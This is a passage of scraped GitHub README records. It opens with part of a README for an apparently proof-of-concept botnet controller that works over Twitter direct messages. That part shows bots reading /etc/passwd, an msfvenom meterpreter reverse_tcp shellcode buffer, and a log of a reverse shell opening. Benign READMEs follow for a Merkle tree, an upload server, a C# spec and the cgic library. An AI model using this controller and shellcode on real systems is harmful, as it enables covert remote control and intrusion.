to execute ```cat \/etc\/passwd```, the script then outputs the ```jobid``` that we can use to retrieve the output of that command\n\n- Lets get the results!\n\n```\n$ !retrieve UMW07r2\nroot:x:0:0:root:\/root:\/bin\/bash\ndaemon:x:1:1:daemon:\/usr\/sbin:\/bin\/sh\nbin:x:2:2:bin:\/bin:\/bin\/sh\nsys:x:3:3:sys:\/dev:\/bin\/sh\nsync:x:4:65534:sync:\/bin:\/bin\/sync\ngames:x:5:60:games:\/usr\/games:\/bin\/sh\nman:x:6:12:man:\/var\/cache\/man:\/bin\/sh\nlp:x:7:7:lp:\/var\/spool\/lpd:\/bin\/sh\nmail:x:8:8:mail:\/var\/mail:\/bin\/sh\nnews:x:9:9:news:\/var\/spool\/news:\/bin\/sh\nuucp:x:10:10:uucp:\/var\/spool\/uucp:\/bin\/sh\nproxy:x:13:13:proxy:\/bin:\/bin\/sh\nwww-data:x:33:33:www-data:\/var\/www:\/bin\/sh\nlist:x:38:38:Mailing List Manager:\/var\/list:\/bin\/sh\nirc:x:39:39:ircd:\/var\/run\/ircd:\/bin\/sh\ngnats:x:41:41:Gnats Bug-Reporting System (admin):\/var\/lib\/gnats:\/bin\/sh\n(...)\n```\n\nCommand to use in that case is ```!retrieve``` followed by the jobid from the command. \n\n- Refresh results\n\nIn order to retrieve new bots\/command outputs but also force the client to refresh the results, use the ```refresh``` command.\n\n```\n$ refresh\n[+] Sending command to retrieve alive bots\n[+] Sleeping 10 secs to wait for bots\n$\n```\n\nThis will send a ```PING``` request and wait 10 seconds for them to answer.\nDirect messages will then be parsed - Bot list will be refreshed but also the command list, including new command outputs. \n\n- Retrieve previous commands\n\nAs I said earlier, (previous) commands will be retrieved from older direct messages (limit is 200) and you can actually retrieve\/see them by using the ```list_commands``` command\n\n```\n$ list_commands\n8WNzapM: 'uname -a ' on 2C:4C:84:8C:D3:B1\nVBQpojP: 'cat \/etc\/passwd' on 2C:4C:84:8C:D3:B1\n9KaVJf6: 'PING' on 2C:4C:84:8C:D3:B1\naCu8jG9: 'ls -al' on 2C:4C:84:8C:D3:B1\n8LRtdvh: 'PING' on 2C:4C:84:8C:D3:B1\n$\n```\n\n- Running shellcode (Windows hosts)\n\nThis option might be handy in order to retrieve a meterpreter session and [this article](http:\/\/netsec.ws\/?p=331#more-331) becomes really useful. \n\nGenerate your meterpreter shellcode, like: \n\n```\n# msfvenom -p windows\/meterpreter\/reverse_tcp LHOST=10.0.0.1 LPORT=3615 -f python\n(...)\nPayload size: 299 bytes\nbuf =  \"\"\nbuf += \"\\xfc\\xe8\\x82\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xc0\\x64\\x8b\"\nbuf += \"\\x50\\x30\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x8b\\x72\\x28\\x0f\\xb7\"\nbuf += \"\\x4a\\x26\\x31\\xff\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\xc1\\xcf\"\nbuf += \"\\x0d\\x01\\xc7\\xe2\\xf2\\x52\\x57\\x8b\\x52\\x10\\x8b\\x4a\\x3c\"\nbuf += \"\\x8b\\x4c\\x11\\x78\\xe3\\x48\\x01\\xd1\\x51\\x8b\\x59\\x20\\x01\"\nbuf += \"\\xd3\\x8b\\x49\\x18\\xe3\\x3a\\x49\\x8b\\x34\\x8b\\x01\\xd6\\x31\"\nbuf += \"\\xff\\xac\\xc1\\xcf\\x0d\\x01\\xc7\\x38\\xe0\\x75\\xf6\\x03\\x7d\"\nbuf += \"\\xf8\\x3b\\x7d\\x24\\x75\\xe4\\x58\\x8b\\x58\\x24\\x01\\xd3\\x66\"\nbuf += \"\\x8b\\x0c\\x4b\\x8b\\x58\\x1c\\x01\\xd3\\x8b\\x04\\x8b\\x01\\xd0\"\nbuf += \"\\x89\\x44\\x24\\x24\\x5b\\x5b\\x61\\x59\\x5a\\x51\\xff\\xe0\\x5f\"\nbuf += \"\\x5f\\x5a\\x8b\\x12\\xeb\\x8d\\x5d\\x68\\x33\\x32\\x00\\x00\\x68\"\nbuf += \"\\x77\\x73\\x32\\x5f\\x54\\x68\\x4c\\x77\\x26\\x07\\xff\\xd5\\xb8\"\nbuf += \"\\x90\\x01\\x00\\x00\\x29\\xc4\\x54\\x50\\x68\\x29\\x80\\x6b\\x00\"\nbuf += \"\\xff\\xd5\\x50\\x50\\x50\\x50\\x40\\x50\\x40\\x50\\x68\\xea\\x0f\"\nbuf += \"\\xdf\\xe0\\xff\\xd5\\x97\\x6a\\x05\\x68\\x0a\\x00\\x00\\x01\\x68\"\nbuf += \"\\x02\\x00\\x0e\\x1f\\x89\\xe6\\x6a\\x10\\x56\\x57\\x68\\x99\\xa5\"\nbuf += \"\\x74\\x61\\xff\\xd5\\x85\\xc0\\x74\\x0a\\xff\\x4e\\x08\\x75\\xec\"\nbuf += \"\\xe8\\x3f\\x00\\x00\\x00\\x6a\\x00\\x6a\\x04\\x56\\x57\\x68\\x02\"\nbuf += \"\\xd9\\xc8\\x5f\\xff\\xd5\\x83\\xf8\\x00\\x7e\\xe9\\x8b\\x36\\x6a\"\nbuf += \"\\x40\\x68\\x00\\x10\\x00\\x00\\x56\\x6a\\x00\\x68\\x58\\xa4\\x53\"\nbuf += \"\\xe5\\xff\\xd5\\x93\\x53\\x6a\\x00\\x56\\x53\\x57\\x68\\x02\\xd9\"\nbuf += \"\\xc8\\x5f\\xff\\xd5\\x83\\xf8\\x00\\x7e\\xc3\\x01\\xc3\\x29\\xc6\"\nbuf += \"\\x75\\xe9\\xc3\\xbb\\xf0\\xb5\\xa2\\x56\\x6a\\x00\\x53\\xff\\xd5\"\n```\n\nExtract the shellcode and send it to the specified bot using the ```!shellcode``` command! \n\n```\n$ !shellcode 11:22:33:44:55 \\xfc\\xe8\\x82\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xc0\\x64\\x8b (...)\n[+] Sent shellcode with jobid: xdr7mtN\n$\n```\n\nEt voil\u00e0! \n\n```\nmsf exploit(handler) > exploit\n\n[*] Started reverse handler on 10.0.0.1:3615 \n[*] Starting the payload handler...\n[*] Sending stage (884270 bytes) to 10.0.0.99\n[*] Meterpreter session 1 opened (10.0.0.1:3615 -> 10.0.0.99:49254) at 2015-09-08 10:19:04 -0400\n\nmeterpreter > getuid\nServer username: WIN-XXXXXXXXX\\PaulSec\n```\n\nOpen a beer and enjoy your reverse meterpreter shell. \n\nContributing and\/or questions? \n=====\n\nProject is entirely open source and released under MIT license.\nI mostly wanted to create a PoC after Twitter decided to remove the 140 characters limit for the Direct Messages. \nFew stuff should be added such as Encryption (Adding AES on top of it). \n\"Messages\" are using a dictionary data structure and the whole command is only base64 encoded. \nFork the project, contribute, submit pull requests, and have fun. \n\nIf you find a bug, open an issue on Github and\/or ping me on [Twitter](http:\/\/twitter.com\/PaulWebSec).\n\nAgain, feel free to check the [Gcat](https:\/\/github.com\/byt3bl33d3r\/gcat) amazing project from [byt3bl33d3r](https:\/\/twitter.com\/byt3bl33d3r) that inspired me a lot.\n"},{"repo":"\/cliftonm\/MerkleTree","language":"HTML","readme_contents":"# MerkleTree\nA Merkle Tree implementation in C#\n\n# Documentation\n[Full Description](https:\/\/cdn.rawgit.com\/cliftonm\/MerkleTree\/master\/Article\/indexWithToc.htm)\n\n# Explore Audit and Consistency Proofs\n![FlowSharp](https:\/\/github.com\/cliftonm\/MerkleTree\/blob\/master\/Article\/demo1.png)\n"},{"repo":"\/liufeihong\/Hyper-Upload-Server","language":"HTML","readme_contents":"# Hyper Upload Server \u8d85\u7ea7\u4e0a\u4f20\u670d\u52a1\u5668\n\n\u8fd9\u662f\u4e00\u6b3e\u8d85\u7ea7\u6587\u4ef6\u4e0a\u4f20\u670d\u52a1\u5668\uff0c\u91c7\u7528\u5f02\u6b65I\/O\u67b6\u6784\uff0c\u91c7\u7528C++\u8bed\u8a00\u7f16\u7801\u5b9e\u73b0\u3002\u5b83\u652f\u63014GB\u4ee5\u4e0a\u8d85\u5927\u6587\u4ef6\u4e0a\u4f20\u548c\u65ad\u70b9\u7eed\u4f20\uff0c\u652f\u6301Windows\u548cLinux\u670d\u52a1\u5668\u5e73\u53f0\uff0c\u652f\u6301\u4efb\u610f\u683c\u5f0f\u7684\u6587\u4ef6\u4e0a\u4f20\uff0c\u5c24\u5176\u9002\u5408\u5927\u7684\u89c6\u9891\u7f51\u7ad9\u5e94\u7528\u3002\u5355\u53f0\u670d\u52a1\u5668\u652f\u63011000\u5e76\u53d1\u4e0a\u4f20\u8fdb\u7a0b\uff0c\u652f\u6301PC\u7aef\u548c\u667a\u80fd\u624b\u673a\u7aef\u4e3b\u6d41\u7684\u6d4f\u89c8\u5668\u3002\n\n## \u4e3b\u8981\u7279\u6027\n1. \u670d\u52a1\u5668\u7aef\u91c7\u7528\u5f02\u6b65I\/O\u67b6\u8bbe\u8bbe\u8ba1\uff0c\u5177\u6709\u9ad8\u6027\u80fdI\/O\u5904\u7406\u80fd\u529b\uff0c\u5c24\u5176\u9002\u7528\u4e8e\u8d85\u5927\u6587\u4ef6\u4e0a\u4f20\uff1b\n2. \u670d\u52a1\u5668\u7aef\u91c7\u7528\u9ad8\u6548\u5185\u5b58\u5206\u914d\u6280\u672f\u786e\u4fdd\u5728\u8fd0\u884c\u8fc7\u7a0b\u4e2d\u670d\u52a1\u5668\u7684\u5185\u5b58\u5f00\u9500\u6700\u5c0f\u5316\uff1b\n3. \u5b8c\u5168\u91c7\u7528\u6807\u51c6\u534f\u8bae\u5b9e\u73b0\uff0c\u56e0\u6b64\u517c\u5bb9\u51e0\u4e4e\u6240\u6709\u7684PC\u7aef\u548c\u79fb\u52a8\u7aef\u6d4f\u89c8\u5668\uff1b\n4. \u670d\u52a1\u5668\u7aef\u91c7\u7528C++\u8bed\u8a00\u81ea\u4e3b\u5b9e\u73b0\uff0c\u5bf9\u4e0a\u4f20\u6587\u4ef6\u7684\u5c3a\u5bf8\u65e0\u9650\u5236\uff0c\u5929\u751f\u652f\u6301\u8d85\u5927\u6587\u4ef6\u4e0a\u4f20\u3002\n   \u800c\u57fa\u4e8ePHP\u3001JAVA\u7b49\u6280\u672f\u5b9e\u73b0\u7684\u6587\u4ef6\u4e0a\u4f20\u670d\u52a1\u5929\u751f\u65e0\u6cd5\u652f\u6301\u8d85\u5927\u6587\u4ef6\u4e0a\u4f20\uff0c\u65e0\u6cd5\u903e\u8d8a2GB\u7684\u6700\u5927\u6587\u4ef6\u5c3a\u5bf8\u74f6\u9888\uff1b\n5. \u670d\u52a1\u5668\u7aef\u91c7\u7528\u65e0\u7f13\u51b2\u5373\u65f6\u5199\u5165\u65b9\u5f0f\uff0c\u4e0a\u4f20\u6570\u636e\u5199\u5165\u4e00\u6b65\u5230\u4f4d\u3002\u4e0d\u540c\u4e8ePHP\u3001JAVA\u7b49\u6280\u672f\u5b9e\u73b0\u65b9\u5f0f\u9700\u8981\u4e24\u6b65\u5199\u5165\uff1b\n6. \u670d\u52a1\u5668\u7aef\u53ef\u8de8\u5e73\u53f0\u7f16\u8bd1\u8fd0\u884c\uff0c\u652f\u6301Windows\u548cLinux\u5e73\u53f0\uff1b\n7. \u9ad8\u6027\u80fd\uff0c\u5355\u53f0\u670d\u52a1\u5668\u652f\u63011000\u4e2a\u5e76\u53d1\u4e0a\u4f20\u8fdb\u7a0b\uff1b\n8. \u652f\u63014GB\u4ee5\u4e0a\u8d85\u5927\u6587\u4ef6\u4e0a\u4f20\uff0c\u6587\u4ef6\u5927\u5c0f\u4e0d\u53d7\u9650\u5236\uff1b\n9. \u5ba2\u6237\u7aef\u652f\u6301\u91c7\u7528HTTP\u6807\u51c6\u534f\u8bae\u4e0a\u4f20\uff1b\n10.\u652f\u6301\u65ad\u70b9\u7eed\u4f20\uff0c\u65ad\u7f51\u3001\u5173\u673a\u91cd\u542f\u5747\u4e0d\u53d7\u5f71\u54cd\uff1b\n11.\u652f\u6301HTML5\u6d4f\u89c8\u5668\u4e0a\u4f20\u8fdb\u5ea6\u5b9e\u65f6\u663e\u793a\uff1b\n12.\u652f\u6301IE8\u53ca\u4ee5\u4e0a\u6d4f\u89c8\u5668\u4e0a\u4f20\u8fdb\u5ea6\u663e\u793a\uff1b\n13.\u652f\u6301\u67e5\u770b\u5ba2\u6237\u7aef\u5728\u7ebf\u8fde\u63a5\uff0c \u67e5\u770b\u65b9\u6cd5\uff1a http:\/\/ip:port\/lists\n14.\u591a\u6d4f\u89c8\u5668\u517c\u5bb9\uff0c\u5305\u62ecChrome\uff0cFirefox\uff0cSafari\uff0cIE\uff0cOpera,Edge\uff1b\n\n## \u5b89\u88c5\n\n- \u7b2c\u4e00\u6b65\uff1a\u89e3\u538b\u6587\u4ef6\u5230\u4e00\u4e2a\u786c\u76d8\u76ee\u5f55\uff0c\u4f8b\u5982d:\\UploadServer\n\n- \u7b2c\u4e8c\u6b65\uff1a\u4fee\u6539\u914d\u7f6e\u6587\u4ef6 \n\t\t\u4fee\u6539d:\\UploadServer\\conf\\config.xml\uff0c\u6587\u4ef6\u91cc\u7684\u76ee\u5f55\u8bbe\u7f6e\uff0c\n\t\t\u5c06\u6240\u6709 dir= \u53d8\u91cf\u6307\u5411\u7684\u76ee\u5f55\u4fee\u6539\u4e3a\u786c\u76d8\u4e0a\u7684\u771f\u5b9e\u76ee\u5f55\uff0c\u5982\u679c\u6ca1\u6709\u5c31\u6309\u914d\u7f6e\u6587\u4ef6\u521b\u5efa\uff1b \n        \n- \u7b2c\u4e09\u6b65\uff1a\u5b89\u88c5\u670d\u52a1 <br\/>\n        \u6267\u884ccmd\u6253\u5f00\u547d\u4ee4\u884c\u7a97\u53e3\u6309\u6b65\u9aa4\u8f93\u5165\u4ee5\u4e0b\u547d\u4ee4\uff1a <br\/>\n        d:  <br\/>\n        cd UploadServer <br\/>\n        HYFileServer.exe -i  <br\/>   \n        \n- \u7b2c\u56db\u6b65\uff1a\u542f\u52a8\u670d\u52a1 <br\/>\n        \u6253\u5f00\u7cfb\u7edf\u7684\u670d\u52a1\u7ba1\u7406\u5668\uff0c\u627e\u5230Hyper Http Upload Service\u670d\u52a1\u542f\u52a8\u5b83\u3002\n                \n- \u7b2c\u4e94\u6b65\uff1a\u5728\u6d4f\u89c8\u5668\u91cc\u8f93\u5165 http:\/\/127.0.0.1:8080 \u67e5\u770b\u670d\u52a1\u5668\u8fd0\u884c\u662f\u5426\u6b63\u5e38 <br>\n        \u5982\u679c\u4e0a\u4f20\u9875\u9762\u6b63\u5e38\u663e\u793a\u8bf4\u660e\u5b89\u88c5\u6210\u529f <br>\n        \u70b9\u51fb\u5176\u4e2d\u4e00\u4e2a\u4e0a\u4f20\u6587\u4ef6\u94fe\u63a5 \u6309\u94ae\u6765\u4e0a\u4f20\u4e00\u4e2a\u6587\u4ef6\u3002 <br>\n        \u5982\u679c\u8981\u5728\u5176\u5b83\u4e3b\u673a\u4e0a\u8bbf\u95ee\u4e0a\u4f20\u670d\u52a1\u5668\u9875\u9762\uff0c\u8bf7\u5c06127.0.0.1\u7528\u5b89\u88c5\u670d\u52a1\u5668\u7684IP\u5730\u5740\u53d6\u4ee3\u3002 <br>\n        \u5982\u679c\u5916\u90e8\u673a\u5668\u8fd8\u4e0d\u80fd\u8bbf\u95ee\uff0c\u8bf7\u68c0\u67e5\u9632\u706b\u5899\u7684\u8bbe\u7f6e\uff0c\u770b\u4e00\u4e0b\u9ed8\u8ba4\u76848080\u7aef\u53e3\u662f\u5426\u5f00\u542f\u3002 <br>\n        \n- \u7b2c\u516d\u6b65\uff1a\u5982\u679c\u8981\u8fdb\u4e00\u6b65\u4e86\u89e3\u4e0a\u4f20\u670d\u52a1\u5668\uff0c\u8bf7\u67e5\u770b d:\\UploadServer\\doc\\\u6587\u4ef6\u4e0a\u4f20\u670d\u52a1\u5668\u4f7f\u7528\u624b\u518c.pdf \u6587\u4ef6 <br>\n\n- Linux \u4e0b\u6267\u884c\u5b89\u88c5  <br>\n.\/hyupdsrv  <br>\n\u5982\u679c\u8981\u4f5c\u4e3a\u5b88\u62a4\u8fdb\u7a0b\uff0c\u6267\u884c  <br>\n.\/hyupdsrv -d <br>\n\n## \u6280\u672f\u6587\u6863\n\u8bf7\u67e5\u770b doc \u76ee\u5f55\u4e0b\u7684\u8bf4\u660e\u624b\u518c\u3002\n\n## \u8054\u7edc\n- QQ:1918098288\n- Mail: 1918098288@qq.com\n\n\n\n\n\n\n\n\n"},{"repo":"\/ljw1004\/csharpspec","language":"HTML","readme_contents":"C# Language Specification\n===========================\n__Version 6__\n\n*Microsoft has not yet released an official copy of the C#6 spec. This is an unofficial draft. __When Microsoft does release its official copy, before end 2016 at the latest, then this current repository will be deleted__. That's because I wouldn't want to have two copies of the C#6 spec floating around.*\n\n(This document is also available for download: [csharp.pdf](CSharp%20Language%20Specification.pdf?raw=true) and [csharp.docx](CSharp%20Language%20Specification.docx?raw=true))\n\n\n* [Introduction](introduction.md)\n    * [Hello world](introduction.md#hello-world)\n    * [Program structure](introduction.md#program-structure)\n    * [Types and variables](introduction.md#types-and-variables)\n    * [Expressions](introduction.md#expressions)\n    * [Statements](introduction.md#statements)\n    * [Classes and objects](introduction.md#classes-and-objects)\n* [Lexical structure](lexical-structure.md)\n    * [Programs](lexical-structure.md#programs)\n    * [Grammars](lexical-structure.md#grammars)\n    * [Lexical analysis](lexical-structure.md#lexical-analysis)\n    * [Tokens](lexical-structure.md#tokens)\n    * [Pre-processing directives](lexical-structure.md#pre-processing-directives)\n* [Basic concepts](basic-concepts.md)\n    * [Application Startup](basic-concepts.md#application-startup)\n    * [Application termination](basic-concepts.md#application-termination)\n    * [Declarations](basic-concepts.md#declarations)\n    * [Members](basic-concepts.md#members)\n    * [Member access](basic-concepts.md#member-access)\n    * [Signatures and overloading](basic-concepts.md#signatures-and-overloading)\n    * [Scopes](basic-concepts.md#scopes)\n    * [Namespace and type names](basic-concepts.md#namespace-and-type-names)\n    * [Automatic memory management](basic-concepts.md#automatic-memory-management)\n    * [Execution order](basic-concepts.md#execution-order)\n* [Types](types.md)\n    * [Value types](types.md#value-types)\n    * [Reference types](types.md#reference-types)\n    * [Boxing and unboxing](types.md#boxing-and-uboxing)\n    * [Constructed types](types.md#constructed-types)\n    * [Type parameters](types.md#type-parameters)\n    * [Expression tree types](types.md#expression-tree-types)\n    * [The dynamic type](types.md#the-dynamic-type)\n* [Variables](variables.md)\n    * [Variable categories](variables.md#variable-categories)\n    * [Default values](variables.md#default-values)\n    * [Definite assignment](variables.md#definite-assignment)\n    * [Variable references](variables.md#variable-references)\n    * [Atomicity of variable references](variables.md#atomicity-of-variable-references)\n* [Conversions](conversions.md)\n    * [Implicit conversions](conversions.md#implicit-conversions)\n    * [Explicit conversions](conversions.md#explicit-conversions)\n    * [Standard conversions](conversions.md#standard-conversions)\n    * [User-defined conversions](conversions.md#user-defined-conversions)\n    * [Anonymous function conversions](conversions.md#anonymous-function-conversions)\n    * [Method group conversions](conversions.md#method-group-conversions)\n* [Expressions](expressions.md)\n    * [Expression classifications](expressions.md#expression-classification)\n    * [Static and Dynamic Binding](expressions.md#static-and-dynamic-binding)\n    * [Operators](expressions.md#operators)\n    * [Member lookup](expressions.md#member-lookup)\n    * [Function members](expressions.md#function-members)\n    * [Primary expressions](expressions.md#primary-expressions)\n    * [Unary operators](expressions.md#unary-operators)\n    * [Arithmetic operators](expressions.md#arithmetic-operators)\n    * [Shift operators](expressions.md#shift-operators)\n    * [Relational and type-testing operators](expressions.md#relational-and-type-testing-operators)\n    * [Logical operators](expressions.md#logical-operators)\n    * [Conditional logical operators](expressions.md#conditional-logical-operators)\n    * [The null coalescing operator](expressions.md#the-null-coalescing-operator)\n    * [Conditional operator](expressions.md#conditional-operator)\n    * [Anonymous function expressions](expressions.md#anonymous-function-expressions)\n    * [Query expressions](expressions.md#query-expressions)\n    * [Assignment operators](expressions.md#assignment-operators)\n    * [Expression](expressions.md#expression)\n    * [Constant expressions](expressions.md#constant-expressions)\n    * [Boolean expressions](expressions.md#boolean-expressions)\n* [Statements](statements.md)\n    * [End points and reachability](statements.md#end-points-and-reachability)\n    * [Blocks](statements.md#blocks)\n    * [The empty statement](statements.md#the-empty-statement)\n    * [Labeled statements](statements.md#labeled-statements)\n    * [Declaration statements](statements.md#declaration-statements)\n    * [Expression statements](statements.md#expression-statements)\n    * [Selection statements](statements.md#selection-statements)\n    * [Iteration statements](statements.md#iteration-statements)\n    * [Jump statements](statements.md#jump-statements)\n    * [The try statement](statements.md#the-try-statement)\n    * [The checked and unchecked statements](statements.md#the-checked-and-unchecked-statements)\n    * [The lock statement](statements.md#the-lock-statement)\n    * [The using statement](statements.md#the-using-statement)\n    * [The yield statement](statements.md#the-yield-statement)\n* [Namespaces](namespaces.md)\n    * [Compilation units](namespaces.md#compilation-units)\n    * [Namespace declarations](namespaces.md#namespace-declarations)\n    * [Extern aliases](namespaces.md#extern-aliases)\n    * [Using directives](namespaces.md#using-directives)\n    * [Namespace members](namespaces.md#namespace-members)\n    * [Type declarations](namespaces.md#type-declarations)\n    * [Namespace alias qualifiers](namespaces.md#namespace-alias-qualifiers)\n* [Classes](classes.md)\n    * [Class declarations](classes.md#class-declarations)\n    * [Partial types](classes.md#partial-types)\n    * [Class members](classes.md#class-members)\n    * [Constants](classes.md#constants)\n    * [Fields](classes.md#fields)\n    * [Methods](classes.md#methods)\n    * [Properties](classes.md#properties)\n    * [Events](classes.md#events)\n    * [Indexers](classes.md#indexers)\n    * [Operators](classes.md#operators)\n    * [Instance constructors](classes.md#instance-constructors)\n    * [Static constructors](classes.md#static-constructors)\n    * [Destructors](classes.md#destructors)\n    * [Iterators](classes.md#iterators)\n* [Structs](structs.md)\n    * [Struct declarations](structs.md#struct-declarations)\n    * [Struct members](structs.md#struct-members)\n    * [Class and struct differences](structs.md#class-and-struct-differences)\n    * [Struct examples](structs.md#struct-examples)\n* [Arrays](arrays.md)\n    * [Array types](arrays.md#array-types)\n    * [Array creation](arrays.md#array-creation)\n    * [Array element access](arrays.md#array-element-access)\n    * [Array members](arrays.md#array-members)\n    * [Array covariance](arrays.md#array-covariance)\n    * [Array initializers](arrays.md#array-initializers)\n* [Interfaces](interfaces.md)\n    * [Interface declarations](interfaces.md#interface-declarations)\n    * [Interface members](interfaces.md#interface-members)\n    * [Fully qualified interface member names](interfaces.md#fully-qualified-interface-member-names)\n    * [Interface implementations](interfaces.md#interface-implementations)\n* [Enums](enums.md)\n    * [Enum declarations](enums.md#enum-declarations)\n    * [Enum modifiers](enums.md#enum-modifiers)\n    * [Enum members](enums.md#enum-members)\n    * [The System.Enum type](enums.md#the-systemenum-type)\n    * [Enum values and operations](enums.md#enum-values-and-operations)\n* [Delegates](delegates.md)\n    * [Delegate declarations](delegates.md#delegate-declarations)\n    * [Delegate compatibility](delegates.md#delegate-compatibility)\n    * [Delegate instantiation](delegates.md#delegate-instantiation)\n    * [Delegate invocation](delegates.md#delegate-invocation)\n* [Exceptions](exceptions.md)\n    * [Causes of exceptions](exceptions.md#causes-of-exceptions)\n    * [The System.Exception class](exceptions.md#the-systemexception-class)\n    * [How exceptions are handled](exceptions.md#how-exceptions-are-handled)\n    * [Common Exception Classes](exceptions.md#common-exception-classes)\n* [Attributes](attributes.md)\n    * [Attribute classes](attributes.md#attribute-classes)\n    * [Attribute specification](attributes.md#attribute-specification)\n    * [Attribute instances](attributes.md#attribute-instances)\n    * [Reserved attributes](attributes.md#reserved-attributes)\n    * [Attributes for Interoperation](attributes.md#attributes-for-interoperation)\n* [Unsafe code](unsafe-code.md)\n    * [Unsafe contexts](unsafe-code.md#unsafe-contexts-)\n    * [Pointer types](unsafe-code.md#pointer-types)\n    * [Fixed and moveable variables](unsafe-code.md#fixed-and-moveable-variables)\n    * [Pointer conversions](unsafe-code.md#pointer-conversions)\n    * [Pointers in expressions](unsafe-code.md#pointers-in-expressions)\n    * [The fixed statement](unsafe-code.md#the-fixed-statement)\n    * [Fixed size buffers](unsafe-code.md#fixed-size-buffers)\n    * [Stack allocation](unsafe-code.md#stack-allocation)\n    * [Dynamic memory allocation](unsafe-code.md#dynamic-memory-allocation)\n* [Documentation comments](documentation-comments.md)\n    * [Introduction](documentation-comments.md#introduction)\n    * [Recommended tags](documentation-comments.md#recommended-tags)\n    * [Processing the documentation file](documentation-comments.md#processing-the-documentation-file)\n    * [An example](documentation-comments.md#an-example)\n* Grammar: [csharp.html](http:\/\/ljw1004.github.io\/csharpspec\/csharp.html). Or download in ANTLR format: [csharp.g4](csharp.g4?raw=true). \n"},{"repo":"\/boutell\/cgic","language":"HTML","readme_contents":"<h1>cgic 2.07: an ANSI C library for CGI Programming<\/h1>\n<h2>By <a href=\"http:\/\/boutell.dev\">Thomas Boutell<\/a><\/h2>\n<blockquote>\n<strong>IMPORTANT NOTICES:<\/strong>\n<p>\nIf you have CGIC 1.05 or earlier, you should upgrade to CGIC 1.07,\nor to CGIC 2.02 or better, in order to obtain important security fixes.\n<p>\nIf you have CGIC 2.0 or CGIC 2.01 and you use the cgiCookie routines, \nyou should upgrade to CGIC 2.02 or better, in order to obtain\nimportant security fixes.\n<\/blockquote>\n<h3>Table of Contents<\/h3>\n<ul>\n<li><a href=\"#credits\">Credits and license terms<\/a>\n<li><a href=\"#whatsnew205\">What's new in version XYZ of CGIC?<\/a>\n<li><a href=\"#whatis\">What is cgic?<\/a>\n<li><a href=\"#obtain\">Obtaining cgic<\/a>\n<li><a href=\"#build\">Building and testing cgic: a sample application<\/a>\n<li><a href=\"#nocompile\">What to do if it won't compile<\/a>\n<li><a href=\"#howto\">How to write a cgic application<\/a>\n<li><a href=\"#images\">How can I generate images from my cgic application?<\/a>\n<li><a href=\"#debug\">CGI debugging features: using capture<\/a>\n<li><a href=\"#functions\">cgic function reference<\/a>\n<li><a href=\"#variables\">cgic variable reference<\/a>\n<li><a href=\"#resultcodes\">cgic result code reference<\/a>\n<li><a href=\"#index\">cgic quick index<\/a>\n<\/ul>\n\n<h3><a name=\"credits\">Credits and License Terms<\/a><\/h3>\n\n<p>\ncgic is now distributed under the MIT license:\n<\/p>\n<p>\nCopyright (c) 1996-2019 Thomas Boutell\n<\/p>\n<p>\nPermission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the \"Software\"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and\/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:\n<\/p>\n<p>\nThe above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.\n<\/p>\n<p>\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.\n<\/p>\n<p>\nThanks are due to Robert Gustavsson, Ken Holervich, Bob Nestor, \nJon Ribbens, Thomas Strangert, Wu Yongwei, and other CGIC users \nwho have corresponded over the years. Although the implementation\nof multipart\/form-data file upload support in CGIC 2.x is my own, \nI particularly wish to thank those who submitted their own \nimplementations of this feature.\n<\/p>\n<h3><a name=\"whatsnew207\">What's new in version 2.07?<\/a><\/h3>\nPer a suggestion by Geoff Mulligan, cgic now tolerates keys without a value in URL-encoded GET and POST submissions. Although the HTML5 spec discourages it, there are existing systems in the wild that do leave the `=` off entirely if the value is an empty string. Beginning with version 2.07, `cgic` handles this as you'd expect: you get an entry with the corresponding key and an empty string as the value. A simple unit test compilation target was also added, to test this feature and rule out side effects.\n<h3><a name=\"whatsnew206\">What's new in version 2.06?<\/a><\/h3>\nA long list of significant fixes generously contributed by Jeffrey Hutzelman.\n<a href=\"https:\/\/github.com\/boutell\/cgic\/commit\/2065a2dfa480209bd6171acb2a4edd6e1c27a062\"> These are especially important on platforms where attempting to read beyong the content length stated by the request can lead to a deadlock. Please see the commit notes.<\/a>\n<h3><a name=\"whatsnew205\">What's new in version 2.05?<\/a><\/h3>\nUploaded files properly closed; corrects a resource leak and enables\nfile uploads to work properly on platforms with particular file\nlocking semantics.\n<h3><a name=\"whatsnew204\">What's new in version 2.04?<\/a><\/h3>\nDocumentation fixes: the cgiHtmlEscape, cgiHtmlEscapeData,\ncgiValueEscape, and cgiValueEscapeData routines were named\nincorrectly in the manual. No code changes in version 2.04.\n<h3><a name=\"whatsnew203\">What's new in version 2.03?<\/a><\/h3>\n<ul>\n<li>Support for setting cookies has been reimplemented. The new\ncode closely follows the actual practice of web sites that successfully\nuse cookies, rather than attempting to implement the specification.\nThe new code can successfully set more than one cookie at a time in\ntypical web browsers.\n<\/ul>\n<h3><a name=\"whatsnew202\">What's new in version 2.02?<\/a><\/h3>\n<ul>\n<li>In CGIC 2.0 and 2.01, if the HTTP_COOKIE environment variable\nwas exactly equal to the name of a cookie requested with cgiCookieString,\nwith no value or equal sign or other characters present, a buffer\noverrun could take place. This was not normal behavior and it is\nunknown whether any actual web server would allow it to occur, however\nwe have of course released a patch to correct it. \nThanks to Nicolas Tomadakis.\n<li>cgiCookieString returned cgiFormTruncated when cgiFormSuccess would\nbe appropriate. Fixed; thanks to Mathieu Villeneuve-Belair.\n<li>Cookies are now set using a simpler Set-Cookie: header, and with\none header line per cookie, based on data collected by Chunfu Lai. \n<li>Memory leaks in cgiReadEnvironment fixed by Merezko Oleg. These\nmemory leaks were <em>not<\/em> experienced in a normal CGI situation, only\nwhen reading 